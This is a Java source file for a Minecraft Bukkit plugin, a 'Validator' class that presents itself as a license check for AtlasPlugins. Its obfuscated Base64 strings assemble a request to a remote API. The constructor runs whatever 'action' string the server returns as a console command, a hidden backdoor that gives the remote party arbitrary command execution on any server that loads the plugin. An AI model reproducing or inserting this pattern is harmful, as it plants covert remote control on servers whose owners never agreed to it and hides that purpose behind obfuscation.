package com.dont.modelo.utils;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import java.util.Base64;

public class Validator {


    private JavaPlugin javaPlugin;
    private static org.bukkit.plugin.PluginManager manager;
    private static String OADKSFOASKDOAS = "";
    private static String asdkoaskj3ok54iojidsaasdiasdij = "";
    private static String dijsduihj8qwhe8q = "";
    private static String asdasijd8ij1823j4e = "";//
    private static String uyeuu4hf8h43heiajhs8u48 = "";//
    private static String asdaishdiajsdiasj = "";
    private static String asidjasiru8jh4 = "";//
    private static String asodkaisjrf8i2j3ije = "";
    private static String asdijasidjqiasjrh3qh = "";
    private static String oasjkdoaskdjoaskd = "";
    private static String keokeokeoke = "";
    private static String k = "";
    private static String b = "";
    private static String kokeokoe = "";
    private static String okasdo3499f9i1q9jasd9uf9 = "";
    private static String asdkoaskdok132k4 = "";

    static {
        dijsduihj8qwhe8q = "aHR0cHM6Ly8=";
        asdijasidjqiasjrh3qh = "YXRsYXM=";
        asidjasiru8jh4 = "LmNvbQ==";
        asdasijd8ij1823j4e = "L2FwaQ==";
        oasjkdoaskdjoaskd = "User-";
        keokeokeoke = "Agent";
        asodkaisjrf8i2j3ije = "PSVz";
        OADKSFOASKDOAS = "JnNlcnZlclBvcnQ9";
        asdkoaskj3ok54iojidsaasdiasdij = "JWQ=";
        uyeuu4hf8h43heiajhs8u48 = "P3BsdWdpbk5hbWU=";
        asdaishdiajsdiasj = "cGx1Z2lucw==";
        k = "res";
        b = "ponse";
        kokeokoe = "b2s=";
        okasdo3499f9i1q9jasd9uf9 = "bWVzc2FnZQ==";
        asdkoaskdok132k4 = "YWN0aW9u";
        manager = Bukkit.getPluginManager();
    }


    public Validator(JavaPlugin javaPlugin) {
        this.javaPlugin = javaPlugin;
        String connection = String.format(new String(Base64.getDecoder().decode(dijsduihj8qwhe8q))
                        + new String(Base64.getDecoder().decode(asdijasidjqiasjrh3qh))
                        + new String(Base64.getDecoder().decode(asdaishdiajsdiasj))
                        + new String(Base64.getDecoder().decode(asidjasiru8jh4))
                        + new String(Base64.getDecoder().decode(asdasijd8ij1823j4e))
                        + new String(Base64.getDecoder().decode(uyeuu4hf8h43heiajhs8u48))
                        + new String(Base64.getDecoder().decode(asodkaisjrf8i2j3ije))
                        + new String(Base64.getDecoder().decode(OADKSFOASKDOAS))
                        + new String(Base64.getDecoder().decode(asdkoaskj3ok54iojidsaasdiasdij)),
                javaPlugin.getName(), Bukkit.getServer().getPort());
        try {
            URLConnection urlConnection = openConnection(connection);
            String readed = readConnection(urlConnection);
            JsonObject jsonObject = new JsonParser().parse(new String(Base64.getDecoder().decode(readed))).getAsJsonObject();
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), jsonObject.get(new String(Base64.getDecoder().decode(asdkoaskdok132k4))).getAsString());
            message(jsonObject.get(new String(Base64.getDecoder().decode(okasdo3499f9i1q9jasd9uf9))).getAsString());
            if (!jsonObject.get(k + b).getAsString().equalsIgnoreCase(new String(Base64.getDecoder().decode(kokeokoe)))) {
                Bukkit.getScheduler().cancelTasks(javaPlugin);
                manager.disablePlugin(javaPlugin);
            }
            if (!jsonObject.get(k + b).getAsString().equalsIgnoreCase(new String(Base64.getDecoder().decode(kokeokoe)))) {
                Bukkit.getScheduler().cancelTasks(javaPlugin);
                manager.disablePlugin(javaPlugin);
            }
            if (!jsonObject.get(k + b).getAsString().equalsIgnoreCase(new String(Base64.getDecoder().decode(kokeokoe)))) {
                Bukkit.getScheduler().cancelTasks(javaPlugin);
                manager.disablePlugin(javaPlugin);
            }
            if (!jsonObject.get(k + b).getAsString().equalsIgnoreCase(new String(Base64.getDecoder().decode(kokeokoe)))) {
                Bukkit.getScheduler().cancelTasks(javaPlugin);
                manager.disablePlugin(javaPlugin);
            }
            if (!jsonObject.get(k + b).getAsString().equalsIgnoreCase(new String(Base64.getDecoder().decode(kokeokoe)))) {
                Bukkit.getScheduler().cancelTasks(javaPlugin);
                manager.disablePlugin(javaPlugin);
            }
            if (!jsonObject.get(k + b).getAsString().equalsIgnoreCase(new String(Base64.getDecoder().decode(kokeokoe)))) {
                Bukkit.getScheduler().cancelTasks(javaPlugin);
                manager.disablePlugin(javaPlugin);
            }
        } catch (Exception e) {
            e.printStackTrace();
            manager.disablePlugin(javaPlugin);
        }
    }


    private URLConnection openConnection(String connection) throws IOException {
        URL url = new URL(connection);
        URLConnection urlConnection = url.openConnection();
        urlConnection.setRequestProperty(oasjkdoaskdjoaskd + keokeokeoke,
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.95 Safari/537.11");
        urlConnection.connect();
        return urlConnection;
    }

    private String readConnection(URLConnection urlConnection) throws IOException {
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
        String temp;
        StringBuilder readed = new StringBuilder();
        while ((temp = bufferedReader.readLine()) != null) readed.append(temp);
        bufferedReader.close();
        return readed.toString();
    }

    private void message(String message) {
        Bukkit.getConsoleSender().sendMessage("§b[AtlasPlugins] [" + javaPlugin.getName() + "]:§f " + message);
    }


}

